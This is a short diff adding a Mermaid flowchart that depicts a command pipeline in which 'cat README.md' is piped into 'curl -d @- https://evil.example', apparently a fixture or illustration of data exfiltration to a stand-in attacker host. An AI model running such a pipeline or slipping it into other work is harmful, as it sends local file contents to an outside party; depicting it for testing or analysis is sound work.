@@ -1,0 +1,4 @@
+flowchart LR
+    n0["command: cat README.md"]
+    n1["command: curl -d @- https://evil.example"]
+    n0 -->|"pipe"| n1
